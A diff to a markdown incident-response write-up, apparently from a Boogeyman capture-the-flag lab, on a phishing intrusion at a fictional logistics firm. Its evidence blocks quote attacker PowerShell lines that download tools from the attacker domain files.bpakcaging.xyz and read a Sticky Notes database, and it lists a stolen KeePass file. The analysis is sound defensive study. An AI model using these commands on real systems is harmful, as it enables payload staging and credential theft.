@@ -3,7 +3,6 @@
 ---
 
 ## 📌 Executive Summary
-
 Quick Logistics LLC experienced a targeted phishing attack conducted by the **Boogeyman threat group**, leading to full compromise of an employee workstation.
 
 The attacker leveraged a malicious LNK file to execute obfuscated PowerShell commands, performed system reconnaissance, accessed sensitive files, and exfiltrated data using DNS tunneling techniques.
@@ -11,7 +10,6 @@ The attacker leveraged a malicious LNK file to execute obfuscated PowerShell com
 ---
 
 ## 📋 Scenario Overview
-
 The attack began with a phishing email impersonating a trusted partner (**B Packaging Inc**) sent to the accounting department.
 
 The victim (Julianne) opened a password-protected archive containing a malicious shortcut file (`.lnk`), which triggered the execution of a hidden PowerShell payload.
@@ -19,11 +17,10 @@ The victim (Julianne) opened a password-protected archive containing a malicious
 ---
 
 ## ⚠️ Initial Access
-
-* Technique: **Phishing Email (T1566.001)**
-* Malicious Attachment: `Invoice_20230103.lnk`
-* Delivery Method: Password-protected ZIP (`Invoice2023!`)
-* Obfuscation: Base64-encoded PowerShell command
+* **Technique:** Phishing Email (T1566.001)
+* **Malicious Attachment:** `Invoice_20230103.lnk`
+* **Delivery Method:** Password-protected ZIP (`Invoice2023!`)
+* **Obfuscation:** Base64-encoded PowerShell command
 
 ![Base64-encoded PowerShell command](../images/Base64-encoded.png)
 
@@ -32,42 +29,35 @@ The victim (Julianne) opened a password-protected archive containing a malicious
 ## 🔍 Investigation & Technical Analysis
 
 ### 1️⃣ Phishing & Payload Execution
-
-* Sender: `agriffin@bpakcaging.xyz`
+* **Sender:** `agriffin@bpakcaging.xyz`
 ![Phishing Email](../images/Email_ph.png)
-* Email service used: `elasticemail` (evasion technique)
+* **Email service used:** `elasticemail` (evasion technique)
 ![evasion technique](../images/Email_service.png)
-* Payload execution via LNK file triggered hidden PowerShell
+* **Payload execution:** via LNK file triggered hidden PowerShell
 
 ---
 
 ### 2️⃣ Endpoint Activity (PowerShell Analysis)
-
 Analysis of PowerShell logs revealed:
 
-* C2 Communication:
-
+* **C2 Communication:**
   * `cdn.bpakcaging.xyz`
   * `files.bpakcaging.xyz`
 
-* Reconnaissance Tool:
-
+* **Reconnaissance Tool:**
   * `seatbelt.exe`
 
 ### 📂 Data Collection & Extraction
-
 The attacker accessed and extracted sensitive data from multiple sources:
 
-- **KeePass Database:**
-  - File: `protected_data.kdbx`
+* **KeePass Database:**
+  * File: `protected_data.kdbx`
 
-- **Sticky Notes Database:**
-  - File: `plum.sqlite`
-  - Tool used: `sq3.exe` (SQLite database reader)
+* **Sticky Notes Database:**
+  * File: `plum.sqlite`
+  * Tool used: `sq3.exe` (SQLite database reader)
 
 #### 🔎 Evidence
-
--
 ```powershell
 .\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100"
 
@@ -81,8 +71,8 @@ The attacker downloaded additional tools from a remote server:
 #### 🔎 Evidence
 
 ```powershell
-iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe
-iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe
+iwr [http://files.bpakcaging.xyz/sq3.exe] -outfile sq3.exe
+iwr [http://files.bpakcaging.xyz/sb.exe] -outfile sb.exe
 
 ![PowerShell Analysis](../images/PowerShell_Analysis.png)
 
@@ -140,6 +130,7 @@ Recovered sensitive data included:
 * `Invoice_20230103.lnk`
 * `protected_data.kdbx`
 * `seatbelt.exe`
+* `sq3.exe`
 
 ### 🧪 Techniques
 
